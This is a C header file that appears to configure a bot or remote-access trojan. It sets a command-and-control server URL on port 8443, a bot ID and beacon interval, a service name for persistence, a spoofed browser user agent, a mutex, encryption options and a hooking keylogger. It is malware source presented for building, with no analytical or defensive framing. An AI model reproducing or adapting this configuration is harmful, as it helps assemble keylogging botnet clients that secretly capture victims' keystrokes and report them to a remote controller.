#pragma once

// config
#define SERVER_URL "http://4R35.candc.efflam.net:8443"
#define BOT_ID ""
#define SLEEP_INTERVAL 10
#define SERVICE_NAME "agent_4R35"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
#define KEYLOGGER_FILE ""
#define MUTEXID "Mutex-4R35"

#define NO_CRYPT
#define SIMPLE_CRYPT
#define TEA_CRYPT
#define HOOK_KEYLOGGER

#ifndef HOOK_KEYLOGGER

#define KEYLOGGER_BUF_SIZE 512
#define KEYLOGGER_SLEEP_TIME 8
#define KEYLOGGER_WINDOWTXT_SIZE 60

#else

#define KEYLOGGER_BUF_SIZE 16

#endif

#define BUFFSIZE   512
#define MAXTHREADS 256